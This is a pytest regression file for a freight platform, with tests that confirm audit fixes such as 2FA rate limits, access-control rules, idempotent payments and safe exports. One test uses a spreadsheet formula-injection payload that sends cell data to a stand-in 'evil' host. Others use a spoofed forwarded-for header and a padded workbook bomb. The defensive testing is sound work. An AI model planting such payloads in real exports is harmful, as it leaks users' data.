"""Regression tests for the security and logic audit: each test pins one fixed defect."""
from __future__ import annotations

import io
import json
import zipfile

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from app.core.context import RequestContext, reset_ctx, set_ctx
from app.core.errors import AppError
from app.db import SessionLocal
from app.main import app
from app.modules.accounts.models import Company, User
from app.modules.deals.models import Deal


@pytest.fixture
def db(client_app):
    s = SessionLocal()
    tok = set_ctx(RequestContext(request_id="", extra={"rls_bypass": True}))
    yield s
    s.rollback()
    s.close()
    reset_ctx(tok)


def test_second_factor_guesses_are_limited_per_account(db):
    from app.core import ratelimit
    from app.modules.accounts.service import verify_second_factor

    ratelimit.reset_all()
    user = db.execute(select(User).where(User.email == "admin@abdex.kz")).scalar_one()
    results = []
    for _ in range(12):
        try:
            results.append(verify_second_factor(db, user, "000000"))
        except AppError as exc:
            results.append(exc.code)
    assert "too_many_attempts" in results and results.index("too_many_attempts") <= 8
    db.rollback()


def test_support_session_is_an_allow_list():
    from app.modules.accounts.support_access import is_forbidden

    did = "01a14597-944e-7b6f-b590-112505db950c"
    assert not is_forbidden("/deals/x", "GET")
    assert not is_forbidden(f"/deals/{did}/chat", "POST") and not is_forbidden("/orders/new", "POST")
    for path in ("/account/notifications/telegram", "/finance/invoices/x/pay", f"/bids/{did}/accept",
                 f"/deals/{did}/docs/{did}/sign-eds", "/company", "/modules/x/subscribe", "/switch-company",
                 "/company/eds/confirm", "/account/push/subscribe"):
        assert is_forbidden(path, "POST"), path


def test_forwarded_for_takes_the_proxy_appended_address(monkeypatch):
    from app.config import settings

    object.__setattr__(settings, "trust_proxy", True)
    try:
        c = TestClient(app)
        seen = []
        from app.core import ratelimit

        orig = ratelimit.hit

        def spy(bucket, key, **kw):
            if bucket == "login":
                seen.append(key)
            return orig(bucket, key, **kw)

        monkeypatch.setattr(ratelimit, "hit", spy)
        page = c.get("/login").text
        from conftest import csrf_from

        c.post("/login", data={"login": "+77019999999", "password": "x", "csrf_token": csrf_from(page)},
               headers={"X-Forwarded-For": "6.6.6.6, 203.0.113.7"}, follow_redirects=False)
        assert seen and seen[-1] == "203.0.113.7"  # not the client-chosen left-most value
    finally:
        object.__setattr__(settings, "trust_proxy", False)


def test_password_step_only_is_not_signed_in(client_app):
    from conftest import PASSWORD, csrf_from

    dbs = SessionLocal()
    u = dbs.execute(select(User).where(User.phone == "+77010000002")).scalar_one()
    u.sms_2fa_enabled = True
    dbs.commit()
    try:
        c = TestClient(app)
        page = c.get("/login").text
        r = c.post("/login", data={"login": "+77010000002", "password": PASSWORD, "csrf_token": csrf_from(page)},
                   follow_redirects=False)
        assert r.headers["location"] == "/login/2fa"
        assert u.full_name not in c.get("/help").text  # no name, companies or counters before the second factor
        assert c.get("/dashboard", follow_redirects=False).headers["location"].startswith("/login/2fa")
        assert c.get("/login/2fa").status_code == 200
    finally:
        u.sms_2fa_enabled = False
        dbs.commit()
        dbs.close()


def test_csv_and_xlsx_cells_never_become_formulas():
    from app.core.export import row
    from app.modules.analytics.service import to_csv, to_xlsx

    evil = '=HYPERLINK("https://evil/?"&A2,"Алматы")'
    assert row([evil, "+1", "-2", "@x", "ok", 5]) == ["'" + evil, "'+1", "'-2", "'@x", "ok", 5]
    assert "'=HYPERLINK" in to_csv([["a"], [evil]]).decode("utf-8-sig")
    from openpyxl import load_workbook

    ws = load_workbook(io.BytesIO(to_xlsx([["a"], [evil]], "x"))).active
    assert ws["A2"].data_type == "s" and ws["A2"].value.startswith("'=")


def test_padded_xlsx_does_not_explode():
    from openpyxl import Workbook

    from app.modules.orders.importer import read_rows

    wb = Workbook()
    ws = wb.active
    ws.append(["from_city", "to_city"])
    for i in range(2, 2000):
        ws.cell(row=i, column=16000, value="x")  # far to the right, thousands of rows
    buf = io.BytesIO()
    wb.save(buf)
    rows = read_rows("bomb.xlsx", buf.getvalue())
    assert len(rows) <= 502


def test_user_values_cannot_inject_document_clauses(db):
    from app.modules.documents.service import generate, one_line

    assert one_line("Цемент\n\n## 7. Штраф 100%\r\n") == "Цемент ## 7. Штраф 100%"
    ctx = {"client_name": "ТОО «Доставка груза»", "client_bin": "1", "subject": "услуги платформы", "amount": "1",
           "deal_number": "SD-1", "due_date": "", "vat_note": ""}
    generate(db, "fee_invoice", ctx)  # a company name with forbidden words no longer blocks its invoice
    db.rollback()


def test_dossier_hides_the_payers_fee_documents_from_the_carrier(login, db):
    from app.modules.documents.models import Document

    deal = db.execute(select(Deal).join(Document, Document.deal_id == Deal.id)
                      .where(Document.doc_type == "fee_invoice")).scalars().first()
    if deal is None:
        pytest.skip("no invoiced deal in the demo data")
    carrier = login("+77020000001")
    r = carrier.get(f"/deals/{deal.id}/dossier.zip")
    assert r.status_code == 200
    names = zipfile.ZipFile(io.BytesIO(r.content)).namelist()
    assert not [n for n in names if "fee_invoice" in n or "fee_act" in n]


def test_executor_change_only_with_own_fleet(login, db):
    from app.modules.fleet.models import Driver, Vehicle

    carrier = db.execute(select(Company).where(Company.name.contains("Жол Транс"))).scalar_one()
    other = db.execute(select(Company).where(Company.name.contains("Сапаров"))).scalar_one()
    deal = db.execute(select(Deal).where(Deal.carrier_company_id == carrier.id)).scalars().first()
    fv = db.execute(select(Vehicle).where(Vehicle.company_id == other.id)).scalars().first()
    fd = db.execute(select(Driver).where(Driver.company_id == other.id)).scalars().first()
    s = login("+77020000001")
    s.post(f"/deals/{deal.id}/executor", {"vehicle_id": str(fv.id), "driver_id": str(fd.id), "reason": "замена"})
    from app.modules.deals.models import ExecutorChange

    db.expire_all()
    assert not db.execute(select(ExecutorChange).where(ExecutorChange.deal_id == deal.id,
                                                       ExecutorChange.new_vehicle_id == fv.id)).first()


def test_moderator_cannot_block_an_administrator(login, db):
    admin = db.execute(select(User).where(User.email == "admin@abdex.kz")).scalar_one()
    mod = login("moderator@abdex.kz")
    r = mod.post(f"/admin/users/{admin.id}/action", {"action": "block", "reason": "проверка"})
    assert r.status_code in (403, 404)
    db.expire_all()
    assert not db.get(User, admin.id).is_blocked


def test_driver_cannot_download_customs_data(login, db):
    from app.modules.fleet.models import Driver

    d1 = db.execute(select(Driver).join(User, User.id == Driver.user_id).where(User.phone == "+77020000003")).scalar_one()
    deal = db.execute(select(Deal).where(Deal.driver_id == d1.id)).scalars().first()
    assert login("+77020000003").get(f"/deals/{deal.id}/customs.xml").status_code == 404


def test_counter_offer_must_be_positive(db):
    from app.core.errors import ValidationFailed
    from app.modules.bids.models import Bid
    from app.modules.bids.service import counter_offer

    bid = db.execute(select(Bid).where(Bid.status == "active")).scalars().first()
    if bid is None:
        pytest.skip("no open bid")
    with pytest.raises(ValidationFailed):
        counter_offer(db, bid, "0")
    db.rollback()


def test_payment_with_the_same_reference_is_recorded_once(db):
    from app.modules.billing.models import Invoice, Payment
    from app.modules.billing.service import register_payment

    client = db.execute(select(Company).where(Company.kind == "client")).scalars().first()
    inv = Invoice(number="СЧ-AUD-000001", company_id=client.id, amount_minor=100_00, status="issued")
    db.add(inv)
    db.flush()
    register_payment(db, inv, 100_00, source="bank_statement", reference="BANK-77")
    register_payment(db, inv, 100_00, source="bank_statement", reference="BANK-77")
    assert len(db.execute(select(Payment).where(Payment.invoice_id == inv.id)).scalars().all()) == 1
    db.rollback()


def test_zero_fee_deal_completes(db):
    from types import SimpleNamespace

    from app.modules.billing import service as billing
    from app.modules.orders import flow

    calls = []
    order = SimpleNamespace(id="o", status=flow.CLOSED_DOCS)
    deal = SimpleNamespace(id="d", number="SD", client_company_id=None)
    fake_invoice = SimpleNamespace(status="paid")
    import contextlib

    from app.core import rls

    orig = (billing.accrue_for_deal, flow.transition, rls.system)
    try:
        rls.system = lambda db_: contextlib.nullcontext()
        billing.accrue_for_deal = lambda db_, d: SimpleNamespace(invoice_id="i")
        flow.transition = lambda db_, o, to, **kw: calls.append(to)
        db_mock = SimpleNamespace(execute=lambda *a, **k: SimpleNamespace(scalar_one_or_none=lambda: deal),
                                  get=lambda model, i: fake_invoice)
        billing._on_status(db_mock, order, flow.UNLOADED, flow.CLOSED_DOCS)
    finally:
        billing.accrue_for_deal, flow.transition, rls.system = orig
    assert calls == [flow.FEE_INVOICED, flow.COMPLETED]


def test_chunked_body_over_the_limit_is_refused(client_app):
    def gen():
        for _ in range(40):
            yield b"x" * (1024 * 1024)

    r = TestClient(app).post("/login", content=gen(), headers={"content-type": "application/x-www-form-urlencoded"})
    assert r.status_code == 413


def test_vat_is_split_in_the_esf(db):
    from app.modules.billing.accounting import esf_xml
    from app.modules.billing.models import Invoice
    from app.modules.platform.service import set_setting

    inv = db.execute(select(Invoice).where(Invoice.amount_minor > 0)).scalars().first()
    if inv is None:
        pytest.skip("no invoice")
    set_setting(db, "platform.requisites", {"name": "AbdEX", "bin": "1", "vat_payer": True})
    xml = esf_xml(db, inv).decode()
    assert "<ndsRate>12</ndsRate>" in xml and "<ndsAmount>" in xml
    gross = inv.amount_minor / 100
    assert f"<priceWithTax>{gross:.2f}</priceWithTax>" in xml
    db.rollback()
    assert json  # imported for symmetry
